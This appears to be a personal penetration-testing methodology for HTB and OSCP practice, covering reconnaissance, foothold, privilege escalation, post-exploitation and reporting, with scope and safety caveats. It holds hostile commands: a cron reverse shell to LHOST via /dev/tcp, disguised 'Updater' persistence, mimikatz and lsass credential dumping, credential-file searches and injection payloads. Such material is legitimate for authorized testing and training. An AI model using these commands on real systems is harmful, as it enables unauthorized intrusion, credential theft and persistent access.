# Methodology

Personal penetration testing methodology, refined through 15+ HTB machines and OSCP preparation.
This is a working document - updated as new techniques and patterns emerge.

> Structure: **Reconnaissance -> Foothold -> Lateral Movement -> Privilege Escalation -> Post-Exploitation**
> At each phase: **what to check -> what to look for -> what to do if stuck**.

---

## Table of Contents

- [Phase 0: Engagement Setup](#phase-0-engagement-setup)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Foothold](#phase-2-foothold)
- [Phase 3: Lateral Movement](#phase-3-lateral-movement)
- [Phase 4: Privilege Escalation](#phase-4-privilege-escalation)
- [Phase 5: Post-Exploitation](#phase-5-post-exploitation)
- [Phase 6: Reporting](#phase-6-reporting)
- [When Stuck](#when-stuck)

---

## Phase 0: Engagement Setup

### Before touching the target

1. **Define scope** - IPs, domains, exclusions. Write it down.
2. **Set up workspace:**

    engagements/<client>/
    +-- recon/        # nmap, masscan, service scans
    +-- web/          # gobuster, ffuf, feroxbuster output
    +-- exploits/     # PoCs, payloads
    +-- loot/         # hashes, creds, flags
    +-- screenshots/  # evidence
    +-- notes.md      # running log

3. **VPN check** - `ip a`, `tun0` up, `ping <target>` works.
4. **Logging** - start `script` session or use `tmux` + `tee` for all commands.

---

## Phase 1: Reconnaissance

### 1.1 Port scanning

**Adaptive scan intensity.** Pick the profile that matches your scope and target type.

| Profile | When to use | Flags |
|---------|-------------|-------|
| **CTF / lab (HTB, OSCP)** | Isolated lab, you own the box, no production risk | `-T4 --min-rate=5000 --defeat-rst-ratelimit` |
| **Authorized production pentest** | Client systems, agreed scope, potential IDS/IPS | `-T3 --max-rate=200 --max-retries 2` |
| **Fragile / unknown** | Embedded, OT, legacy services | `-T2 --max-rate=50 --scan-delay 1s` |

**Full TCP scan with the chosen profile:**

    # Lab profile (default for HTB/OSCP)
    nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n TARGET -oA scans/quick

    # Production / cautious profile
    nmap -p- -T3 --max-rate=200 --max-retries 2 -Pn -n TARGET -oA scans/quick

**Then targeted deep scan on open ports (any profile):**

    nmap -sC -sV -Pn -n --open -p PORTS TARGET -oA scans/detail

**UDP top ports (do not skip - but keep intensity low):**

    sudo nmap -sU --top-ports 50 TARGET

### 1.1a Intensity decision tree

    Scope allows aggressive scanning?
    |
    +-- Yes (HTB/OSCP, isolated lab) ------> -T4, min-rate=5000, parallel tools
    |
    +-- No (production, shared infrastructure)
        |
        +-- Target is resilient (web app, API)?
        |   |
        |   +-- Yes --> -T3, max-rate=200, sequential, watch for 429/503
        |   |
        |   +-- No (OT, embedded, legacy)
        |       |
        |       +-- -T2, max-rate=50, scan-delay 1s, single-threaded
        |
        +-- Previous scans caused issues?
            |
            +-- Yes --> reduce intensity one level, document in RoE notes
            +-- No  --> keep current profile, monitor for degradation

**Rule of thumb:** start lower than you think you need. You can always re-run at higher intensity; you cannot un-crash a service.

---

### 1.2 Decision tree by port

| Port | Next action |
|------|-------------|
| 21 (FTP) | Anonymous login; version -> CVE; writable dirs |
| 22 (SSH) | Version -> CVE; default creds; key-based auth |
| 79 (Finger) | User enumeration; office/location fields as hints |
| 80/443 (HTTP) | Full web enumeration (see 1.3) |
| 111 (rpcbind) | `showmount -e` for NFS exports |
| 139/445 (SMB) | `smbclient -L`, `enum4linux`, `crackmapexec` |
| 389/636 (LDAP) | `ldapsearch` anonymous; `bloodhound-python` with creds |
| 2049 (NFS) | `showmount -e`; check `no_root_squash` |
| 3306/5432 (DB) | Default creds; version -> CVE |
| 5985/5986 (WinRM) | `evil-winrm` with creds |
| 8080/8443 | Treat as web |

### 1.3 Web enumeration

**Parallelize only if allowed.** Aggressive parallel enumeration can crash fragile web apps or trigger WAF/rate-limits. Coordinate with the client.

- **Lab (HTB/OSCP)** - run all tools in parallel.
- **Production** - run **one tool at a time**, with `-t 5` or lower, and watch for 429/503 responses.

    ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://TARGET/FUZZ -c -t 20
    gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 20
    ffuf -w wordlist.txt -u http://TARGET/FUZZ -e .php,.txt,.bak,.old,.zip,.tar.gz -t 20
    ffuf -w subdomains.txt -u http://TARGET/ -H "Host: FUZZ.domain" -t 20
    whatweb -a 3 http://TARGET/

**Production profile:** replace `-t 20` with `-t 5` and add `-p 0.1` (ffuf) / `--delay 200ms` (gobuster).

**What to look for:**

- Version numbers in headers, comments, `/readme.txt`, `/version`, `changelog`.
- `.git/`, `.env`, `backup/`, `admin/`, `api/`, `swagger.json`.
- Forms (login, upload, search, contact).
- Cookies (session format, JWT).
- HTML comments (`<!-- TODO: ... -->`, credentials, hints).

### 1.4 Service-specific

**SMB:**

    smbclient -L //TARGET/ -N
    smbmap -H TARGET
    enum4linux -a TARGET
    crackmapexec smb TARGET --shares

**NFS:**

    showmount -e TARGET
    mount -t nfs TARGET:/share /mnt/nfs -o nolock

**Finger:**

    finger-user-enum.pl -u root -t TARGET

---

## Phase 2: Foothold

### 2.1 Web application - attack priority

**Most common -> least:**

1. **Authentication bypass** - SQLi in login, JWT none alg, default creds.
2. **File upload** - extension filter bypass, MIME bypass, magic bytes (`GIF8;`).
3. **LFI/RFI** - `php://filter`, log poisoning, phpinfo race.
4. **Command injection** - `$()`, `;`, `|`, `&&`, `${IFS}` for spaces.
5. **SSTI** - `{{7*7}}`, Twig, Jinja2 -> RCE.
6. **Deserialization** - Java (ysoserial), PHP, .NET.
7. **XXE** - file read, SSRF.
8. **SSRF** - internal service access, cloud metadata.
9. **IDOR** - change IDs in requests.
10. **Known CVEs** - always check version against CVE databases.

### 2.2 CVE hunting workflow

    # 1. Identify version (headers, /readme, /version, wappalyzer)
    # 2. searchsploit
    searchsploit PRODUCT VERSION
    # 3. Google: "PRODUCT VERSION CVE"
    # 4. GitHub: "CVE-YYYY-NNNNN PoC"
    # 5. Test in isolated env if possible

### 2.3 Direct service exploitation

**SSH:**

- Default creds (`root:root`, `admin:admin`).
- Key-based auth: if you find `.ssh/id_rsa` or `.ppk`, convert and use.
- Version CVE.

**FTP:**

- Anonymous login.
- Writable dir -> upload webshell.
- Version CVE.

**Database:**

- Default creds (`root:root`, `postgres:postgres`).
- If you have file read/write -> webshell via `INTO OUTFILE`.

### 2.4 Web shell stabilization

    # 1. Start PTY
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    # 2. Ctrl+Z
    # 3. On attacker:
    stty raw -echo; fg
    # 4. On target:
    export TERM=xterm
    export SHELL=/bin/bash
    stty rows 50 cols 200

---

## Phase 3: Lateral Movement

### 3.1 Credential discovery

**Search local files:**

    find / -name "*.conf" -o -name "*.config" -o -name "*.env" 2>/dev/null
    find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
    find / -name "id_rsa" -o -name "*.ppk" -o -name "authorized_keys" 2>/dev/null
    grep -r "password" /var/www/ 2>/dev/null
    grep -r "password" /opt/ 2>/dev/null

**Key locations:**

- Web app configs: `.env`, `config.php`, `application.properties`, `hibernate.cfg.xml`, `web.config`.
- JAR/WAR files (unzip and grep).
- `/home/*/.bash_history`, `.zsh_history`.
- Database backups, `/backup/`, `/var/backups/`.
- Password managers (`*.kdbx` - KeePass).
- SSH keys, PPK files.
- Environment variables (`env`, `/proc/*/environ`).

### 3.2 Password reuse

- Always try found creds on SSH, SMB, WinRM, web admin.
- Try across users (e.g., `brollin` password works for `kevin`).
- Try variations: capitalize, append `!`, `2024`, `2025`, `2026`.

### 3.3 Credential harvesting

**From databases:**

    SELECT user, password FROM mysql.user;
    SELECT username, password FROM users;

**From configs:**

    cat /var/www/html/config.inc.php
    cat /opt/app/application.properties

**From memory (Windows):**

    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
    procdump.exe -ma lsass.exe lsass.dmp

### 3.4 Pivot to internal services

**Services on localhost (127.0.0.1):**

    netstat -tulpn
    ss -tulpn

Then use SSH tunnel:

    ssh -L LOCAL_PORT:127.0.0.1:REMOTE_PORT user@pivot

---

## Phase 4: Privilege Escalation

### 4.1 Linux - checklist

    # Automated
    ./linpeas.sh
    ./LinEnum.sh -t
    ./lse.sh -l 2

    # sudo
    sudo -l

    # SUID / SGID
    find / -perm -4000 -type f 2>/dev/null
    find / -perm -2000 -type f 2>/dev/null

    # Capabilities
    getcap -r / 2>/dev/null

    # Cron
    crontab -l
    cat /etc/crontab
    ls -la /etc/cron.*
    systemctl list-timers --all

    # Network
    netstat -tulpn
    ss -tulpn

    # Users / groups
    cat /etc/passwd
    cat /etc/group
    id

    # Writable files by current user
    find / -writable -type f 2>/dev/null | grep -v proc

### 4.2 Linux - common vectors

1. **sudo** - GTFOBins for the allowed binary.
2. **SUID binaries** - GTFOBins, custom exploits.
3. **Cron jobs** - writable scripts run by root.
4. **PATH injection** - SUID binary calling commands by name.
5. **NFS no_root_squash** - mount, place SUID binary.
6. **Writable systemd units / Docker socket**.
7. **Kernel exploits** - last resort, risky on exam.

### 4.3 Windows - checklist

    whoami /all
    whoami /priv
    systeminfo
    net user
    net localgroup Administrators
    wmic service get name,displayname,pathname,startmode

    # Automated
    winpeas.exe
    Seatbelt.exe -group=all
    SharpUp.exe audit
    PowerUp.ps1

### 4.4 Windows - common vectors

1. **SeImpersonatePrivilege** - GodPotato, PrintSpoofer, JuicyPotato.
2. **Unquoted service path**.
3. **Weak service permissions** - `sc config`.
4. **AlwaysInstallElevated**.
5. **Stored credentials** - `cmdkey /list`, registry.
6. **Scheduled tasks** with writable binaries.
7. **MySQL UDF Hijacking** if File_priv = Y and writable plugin dir.

---

## Phase 5: Post-Exploitation

### 5.1 Evidence collection

- Screenshots of flags (`user.txt`, `root.txt` / `proof.txt`).
- Save command output to files in `loot/`.
- Note every step for the report.

### 5.2 Persistence (only if in scope)

**Linux:**

    echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"' | crontab -
    echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys

**Windows:**

    schtasks /create /tn "Updater" /tr "C:\Windows\Temp\shell.exe" /sc onlogon
    reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Windows\Temp\shell.exe"

### 5.3 Cleanup

> **Scope:** Remove only **your own** test artifacts (exploit scripts, uploaded payloads, temp files). Deleting system logs, shell history, or audit trails (**anti-forensics**) is **out of scope** for this repo: not required for HTB/OSCP, and in a real engagement it is prohibited unless explicitly authorized in the Rules of Engagement.

**Remove your artifacts:**

    shred -u /tmp/exploit.py
    rm -rf /tmp/payloads/
    del C:\Windows\Temp\shell.exe
    del C:\Windows\Temp\file.exe

**What NOT to do (anti-forensics, out of scope):**

    # history -c
    # rm -f ~/.bash_history
    # wevtutil cl System
    # wevtutil cl Security

---

## Phase 6: Reporting

### Structure of a pentest report

1. **Executive Summary** - for management, no jargon.
2. **Scope & Rules of Engagement**.
3. **Methodology** - what was done, in what order.
4. **Findings** - one section per vulnerability:
   - Title, severity (CVSS), affected asset.
   - Description (what, why it matters).
   - Steps to reproduce (commands, screenshots).
   - Impact (business + technical).
   - Remediation (specific, actionable).
5. **Appendices** - raw scan output, full logs.

### OSCP exam report specifics

Report structure, evidence rules, and screenshot requirements are documented separately:

- See [`methodology/OSCP-Reporting.md`](./methodology/OSCP-Reporting.md) for the current checklist (evidence, screenshots, report structure, common mistakes).
- OffSec recommends the official exam report template, but does not mandate a specific format - verify the current requirements in the OffSec exam guide before submission.

Quick summary (details in the linked document):

- Each machine: Attack Chain -> Briefing -> Recon -> Foothold -> PrivEsc -> Flags -> Takeaways.
- Screenshots of `whoami`, `ipconfig`/`ip a`, and flag files are mandatory.
- Full command logs go to the appendix; the main body stays readable.
- Separate section for **Active Directory set** (if applicable).
- Submit within 24 hours.

---

## When Stuck

### Checklist of things to re-check

1. **Re-scan** - did nmap miss a port? Try `-p-` again, UDP top-ports.
2. **Re-enumerate** - did feroxbuster miss a directory? Try bigger wordlist, extensions.
3. **Read the source** - view page source, check JS files, robots.txt, sitemap.xml.
4. **Check versions** - every service version against CVE databases.
5. **Try default creds** - `admin:admin`, `root:root`, product-specific defaults.
6. **Look at error messages** - they often leak paths, versions, stack traces.
7. **Check permissions** - `ls -la` in interesting directories.
8. **Check history** - `.bash_history`, `.zsh_history`, browser history.
9. **Re-read hints** - the machine name, description, banner often hint at the vector.
10. **Take a break** - 15 minutes away, come back with fresh eyes.

### Debugging checklist

- **Payload not working?** Check encoding (URL, base64), firewall, listener.
- **Shell dying?** Stabilize with PTY, check keepalive.
- **Command not found?** Check `$PATH`, use full paths.
- **Permission denied?** Check `ls -la`, `id`, `sudo -l`.
- **Connection refused?** Check listener, check target port, check firewall.

---

*This methodology is a living document. Update it as new patterns emerge.*
